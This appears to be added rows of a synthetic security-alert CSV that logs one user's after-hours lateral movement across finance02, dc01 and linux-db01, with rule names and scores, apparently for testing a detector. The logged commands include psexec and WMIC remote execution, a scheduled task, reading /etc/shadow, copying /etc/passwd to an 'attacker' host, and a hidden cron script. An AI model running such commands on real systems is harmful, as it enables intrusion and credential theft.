+2025-11-15 23:12:22,emp045,finance02,Sensitive host access,Event 4688 [psexec.exe | src=10.0.10.55] on finance02 cmd: cmd.exe /c net use \\finance02\ADMIN$ && psexec \\finance02 -s cmd.exe,0.85
+2025-11-15 23:12:22,emp045,finance02,Remote process creation,Event 4688 [psexec.exe | src=10.0.10.55] on finance02: cmd.exe /c net use \\finance02\ADMIN$ && psexec \\finance02 -s cmd.exe,0.7
+2025-11-15 23:12:30,emp045,finance02,Sensitive host access,Event 4698 [schtasks.exe | src=10.0.10.55] on finance02 cmd: schtasks /create /s finance02 /tn SysUpdater /tr cmd.exe,0.85
+2025-11-15 23:12:35,emp045,finance02,Remote process creation,Event 4688 [psexec.exe | src=10.0.10.55] on finance02: C:\Windows\PSEXESVC.exe,0.7
+2025-11-15 23:12:35,emp045,finance02,Sensitive host access,Event 4688 [psexec.exe | src=10.0.10.55] on finance02 cmd: C:\Windows\PSEXESVC.exe,0.85
+2025-11-15 23:14:00,emp045,dc01,Multiple hosts in short time,Event 4624 [- | src=10.0.10.55] hopped to dc01 (after ['finance02']),0.75
+2025-11-15 23:14:00,emp045,dc01,Sensitive host access,Event 4624 [- | src=10.0.10.55] on dc01 (unauthorized host access),0.85
+2025-11-15 23:14:00,emp045,dc01,Login outside working hours,Event 4624 [- | src=10.0.10.55] logon on dc01 at 23:14:00 (outside 06:00-18:00),0.55
+2025-11-15 23:14:10,emp045,dc01,Sensitive host access,Event 5140 [- | src=10.0.10.55] on dc01 cmd: \\dc01\C$,0.85
+2025-11-15 23:14:10,emp045,dc01,Admin share access,Event 5140 [- | src=10.0.10.55] cmd: \\dc01\C$,0.8
+2025-11-15 23:14:12,emp045,dc01,Sensitive host access,Event 4624 [mstsc.exe | src=10.0.10.55] on dc01 cmd: rdp_session_51,0.85
+2025-11-15 23:14:12,emp045,dc01,Login outside working hours,Event 4624 [mstsc.exe | src=10.0.10.55] logon on dc01 at 23:14:12 (outside 06:00-18:00),0.55
+2025-11-15 23:14:20,emp045,dc01,Sensitive host access,Event 4688 [wmic.exe | src=10.0.10.55] on dc01 cmd: wmic /node:dc01 process call create powershell.exe,0.85
+2025-11-15 23:14:20,emp045,dc01,Remote process creation,Event 4688 [wmic.exe | src=10.0.10.55] on dc01: wmic /node:dc01 process call create powershell.exe,0.7
+2025-11-15 23:14:22,emp045,dc01,Sensitive host access,Event 4688 [wmic.exe | src=10.0.10.55] on dc01 cmd: wmic /node:dc01 process call create powershell.exe,0.85
+2025-11-15 23:14:22,emp045,dc01,Remote process creation,Event 4688 [wmic.exe | src=10.0.10.55] on dc01: wmic /node:dc01 process call create powershell.exe,0.7
+2025-11-15 23:16:00,emp045,linux-db01,Sensitive host access,Event 4624 [sshd | src=10.0.10.55] on linux-db01 (unauthorized host access),0.85
+2025-11-15 23:16:00,emp045,linux-db01,Multiple hosts in short time,"Event 4624 [sshd | src=10.0.10.55] hopped to linux-db01 (after ['dc01', 'finance02'])",0.75
+2025-11-15 23:16:00,emp045,linux-db01,Login outside working hours,Event 4624 [sshd | src=10.0.10.55] logon on linux-db01 at 23:16:00 (outside 06:00-18:00),0.55
+2025-11-15 23:16:15,emp045,linux-db01,Sensitive host access,Event 4688 [sudo | src=-] on linux-db01 cmd: /usr/bin/cat /etc/shadow,0.85
+2025-11-15 23:16:15,emp045,linux-db01,Remote process creation,Event 4688 [sudo | src=-] on linux-db01: /usr/bin/cat /etc/shadow,0.7
+2025-11-15 23:16:25,emp045,linux-db01,Remote process creation,Event 4688 [scp | src=10.0.10.55] on linux-db01: scp /etc/passwd attacker@10.0.10.55:/tmp/,0.7
+2025-11-15 23:16:25,emp045,linux-db01,Sensitive host access,Event 4688 [scp | src=10.0.10.55] on linux-db01 cmd: scp /etc/passwd attacker@10.0.10.55:/tmp/,0.85
+2025-11-15 23:16:35,emp045,linux-db01,Sensitive host access,Event 4688 [cron | src=-] on linux-db01 cmd: /tmp/.persist.sh,0.85
+2025-11-15 23:16:35,emp045,linux-db01,Remote process creation,Event 4688 [cron | src=-] on linux-db01: /tmp/.persist.sh,0.7
